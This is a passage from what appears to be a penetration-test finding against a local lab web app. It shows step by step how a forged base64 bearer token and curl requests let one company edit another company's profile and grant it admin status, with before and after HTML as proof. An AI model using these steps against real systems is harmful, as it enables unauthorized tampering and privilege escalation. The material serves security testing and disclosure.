- **Impact:** Critical data integrity breach - ability to modify ANY company's privilege level and profile data
- **Severity:** Critical

**Prerequisites:**
Ability to forge tokens (via base64 encoding)

**Exploitation Steps:**

1. Generate forged token for target company:
```bash
python3 -c "import base64; print(base64.b64encode(b'3').decode())"
# Output: Mw==
```

2. Check current profile state:
```bash
curl -X GET 'http://localhost:38803/edit_profile/3' \
  -H 'Cookie: access_token=Bearer Mw=='
# Shows: name="company3", is_admin=Regular (not selected)
```

3. Modify victim's profile with malicious data:
```bash
curl -X POST 'http://localhost:38803/edit_profile/3' \
  -H 'Cookie: access_token=Bearer Mw==' \
  -d 'name=HACKED_COMPANY&is_admin=1'
```

4. Verify modification:
```bash
curl -X GET 'http://localhost:38803/edit_profile/3' \
  -H 'Cookie: access_token=Bearer Mw=='
# Shows: name="HACKED_COMPANY", is_admin=Admin (selected)
```

**Proof of Impact:**

**Before modification:**
```html
<input type="text" class="form-control" id="name" name="name" value="company3" required>
<select class="form-control" id="is_admin" name="is_admin" disabled>
    <option value="0" selected>Regular</option>
    <option value="1">Admin</option>
</select>
```

**After modification:**
```html
<div class="alert alert-success" role="alert">
    Profile updated successfully
</div>
<input type="text" class="form-control" id="name" name="name" value="HACKED_COMPANY" required>
<select class="form-control" id="is_admin" name="is_admin">
    <option value="0">Regular</option>
    <option value="1" selected>Admin</option>
</select>
```

Successfully changed:
- Company name from "company3" to "HACKED_COMPANY"
- Admin status from Regular to Admin

**Notes:**
This is the most severe horizontal IDOR as it enables write operations. Attackers can:
- Deface company profiles by changing names
- Elevate ANY company to admin status
- Potentially lock out legitimate users by changing critical data
- This combines horizontal IDOR (accessing other companies) with vertical escalation (modifying privilege levels)
